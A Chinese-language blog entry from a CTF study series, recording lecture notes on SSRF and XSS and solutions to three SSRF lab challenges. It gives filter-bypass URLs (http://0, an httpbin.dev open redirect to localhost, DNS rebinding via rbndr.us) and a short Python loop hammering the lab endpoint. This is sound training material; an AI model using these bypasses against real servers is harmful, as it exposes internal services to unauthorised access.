---
title: IThome 2024 鐵人賽 一直刷 CTF - Day23
tags:
  - IThome 2024 鐵人賽
  - CTF
  - 資安
categories:
  - IThome 2024 鐵人賽
  - 一直刷 CTF
abbrlink: 58277
date: 2024-09-26 00:00:00
lang:
---

## 前言

本日進度：

- [x] [【成大資安社社課】不是web3.0的 web3 - 完](https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV)

<!--more-->

## 上課紀錄

### SSRF (Server-Side Request Forgery)

- 伺服器端請求偽造 (Server-Side Request Forgery)
- 繞過防火牆，存取內網設備
- 多數資料庫、 mail server 等機敏設備會選擇架在內網

#### 先回看 url 的定義 rfc3986

![Image](https://i.imgur.com/ljodqkf.png)

![Image](https://i.imgur.com/0KUwmy1.png)

對於 scheme 的利用

1. 本地
  ![Image](https://i.imgur.com/rEcHVqA.png)
2. php 偽協議
  ![Image](https://i.imgur.com/9K9Ymzg.png)

#### gopher

![Image](https://i.imgur.com/U0OVwny.png)

但 gopher 這堂課不會詳細講道，之後再看

#### 檢查 authority 是否合法

目標: 成功存取內網的 ip 位置

可能被阻擋的方法

1. 黑名單
  ![Image](https://i.imgur.com/y1QBoom.png)

   - 破解方法：
      ![Image](https://i.imgur.com/ueyAIFd.png)
      ![Image](https://i.imgur.com/KvMPbY1.png)
      ![Image](https://i.imgur.com/MUD32zD.png)

      利用 Domain 混淆
      ![Image](https://i.imgur.com/sCh9gjp.png)

2. 白名單
  ![Image](https://i.imgur.com/Wup4aoG.png)

   - 破解方法：

      利用 Open Redirect
      ![Image](https://i.imgur.com/3wYfCiz.png)
      `https://google.com/amp/moon-jam.me` 就會自動轉址到 `moon-jam.me`
      ![Image](https://i.imgur.com/ZS9eYR1.png)

3. DNS 解析後判斷是否合法
  ![Image](https://i.imgur.com/GHpEr4K.png)

    - 破解方法：
  
        利用 DNS Rebinding
        ![Image](https://i.imgur.com/NOvLsSl.png)

        [製作 DNS Rebinding 的網站](https://lock.cmpxchg8b.com/rebinder.html)

        上一秒的時候解析是 `8.8.8.8` 所以不會被擋掉
        ![Image](https://i.imgur.com/ak0NxJ5.png)

        但下一秒的時候解析就變成 `127.0.0.1` 了，就能成功存取內網 ip
        ![Image](https://i.imgur.com/LIVN8Dd.png)

        orange 做的神奇東西，在不同服務解析出來的結果不一樣
        ![Image](https://i.imgur.com/qqfvEfU.png)

### Lab - ssrf 1

用之前介紹的方法，利用 `http://0` 會被當成 `http://localhost` ，所以就可以成功存取內網 ip

![Image](https://i.imgur.com/jGfydVd.png)

### Lab - ssrf 2

看他的程式碼知道網址的開頭要是 `httpbin.dev` ，去 `https://httpbin.dev` 看看有什麼東西，發現了

![Image](https://i.imgur.com/Zm0JXIU.png)

於是只要使用 `https://httpbin.dev/redirect-to?url=http://localhost/internal-only` 就可以成功存取內網 ip 拿盪 flag 了

### Lab - ssrf 3

這提是用 DNS Rebinding 的方式，但試了好幾次都沒成功，只好來寫個程式以量取勝

```python
import requests

url = "http://chall.nckuctf.org:28123/mkreq?url=http%3A%2F%2F7f000001.c0a80001.rbndr.us%2Finternal-only"

while True:
    response = requests.get(url)
    print(response.text)
    if "NCKU" in response.text:
        print(response.text)
        break
```

然後跑一下下之後就拿到 flag 了

### Front-end Security

除了 XSS 和 CSRF 之外，還有很多其他的酷東西

![Image](https://i.imgur.com/L8o8SWr.png)

> 網頁前端本身的限制，例如說不可能單純透過網頁讓你家的印表機列印東西，需要一個本地的伺服器，讓網頁去戳本地伺服器，再由本地伺服器去戳印表機

So

![Image](https://i.imgur.com/ao7YNDA.png)

![Image](https://i.imgur.com/RvwTkNK.png)

這個 CVE 只要你點開一個網頁，你的小算盤就會跳出來

![Image](https://i.imgur.com/6oxMp54.png)

或者是很多人用的 electron ，背後其實也算是一個瀏覽器，也有可能被攻擊

#### XSS

![Image](https://i.imgur.com/20CaJLG.png)

Self-XSS: 只能攻擊自己的 XSS ，但可能可以透過其他攻擊手法造成更嚴重的影響

![Image](https://i.imgur.com/Dp5Rdw5.png)

Blind-XSS: XSS 在不知道甚麼時候可能會被觸發，例如當你把名字改成 XSS payload

有個人把自己特斯拉的名字改成 XSS payload ，有天車壞了拿去送修，結果剛好 XSS payload 被觸發，拿到 10000 USD 的 Bug Bounty

![Image](https://i.imgur.com/YeJOIpu.png)

![Image](https://i.imgur.com/MyJkVIk.png)

分類

1. Relfected XSS (Non-persistent XSS)
   ![Image](https://i.imgur.com/YsfFT77.png)
   ![Image](https://i.imgur.com/LPdmuv6.png)
   ![Image](https://i.imgur.com/vDv01Cl.png)
2. Stored XSS (Persistent XSS)
   ![Image](https://i.imgur.com/gHNMDqY.png)
3. DOM-based XSS
   ![Image](https://i.imgur.com/LgsjI8p.png)

常見 payload

![Image](https://i.imgur.com/Py4uauU.png)
![Image](https://i.imgur.com/NqehmvQ.png)
![Image](https://i.imgur.com/zz3gOLj.png)
![Image](https://i.imgur.com/5d5QwDo.png)

常見 payload - javascript 偽協議

![Image](https://i.imgur.com/Zcrcv4g.png)

避免 `htmlescape`

![Image](https://i.imgur.com/eszQLas.png)

![Image](https://i.imgur.com/uxmNqn4.png)

![Image](https://i.imgur.com/b2RFaqC.png)

因為 javascript 偽協議可以不包含任何雙引號，所以就可以繞過 `htmlescape`

常見 payload - innerHTML bitfall

![Image](https://i.imgur.com/OJoDskQ.png)
![Image](https://i.imgur.com/2ipNEu0.png)
![Image](https://i.imgur.com/M2Q4HXC.png)
![Image](https://i.imgur.com/44i3u6n.png)

[玩 XSS game~](https://xss-game.appspot.com/)

#### XSS worm

![Image](https://i.imgur.com/JMbinYv.png)

### TODO

搞懂那 XSS Lab 怎麼拿到 Flag

## 參考資料

- [【成大資安社社課】手把手Python教學 --- 從入門到入侵](https://youtu.be/-cMOv9QudOk?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z)
- [【成大資安社社課】WEB 1](https://youtu.be/N60VGmhfhy0?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z)
- [【成大資安社社課】WEB 2](https://youtu.be/PqydmB-IoYc?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z)
- [【成大資安社社課】不是web3.0的 web3 - Vincent55](https://youtu.be/xjnAnrfApJo?list=PLFFwfkaPB2mqsfIQvdoT6xc0CziXhmrEV)
- [【成大資安社社課】Crypto 1](https://youtu.be/nVXA9S9Y07M?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z)
- [【成大資安社社課】Crypto 2](https://youtu.be/LtWiQxbMjwg?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z)
- [【成大資安社社課】Linux 基礎指令與使用者管理](https://youtu.be/8WVrUqjBsRE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z)
- [【成大資安社社課】淺談網路與 H T T P](https://youtu.be/pNhHXhPkNcE?list=PLFFwfkaPB2mra818QJIiPJtXFShdndl9z)
